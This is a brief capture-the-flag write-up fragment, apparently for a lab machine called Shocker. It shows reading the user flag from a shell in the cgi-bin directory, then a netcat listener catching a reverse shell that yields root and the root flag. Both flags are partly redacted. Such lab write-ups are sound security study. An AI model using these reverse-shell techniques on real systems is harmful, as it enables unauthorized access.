# user flag
```
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
cat /home/shelly/user.txt
dc2<SNIP>1c35
```

# root flag
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337   
listening on [any] 1337 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.56] 50238
# id       
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
31<SNIP>209
```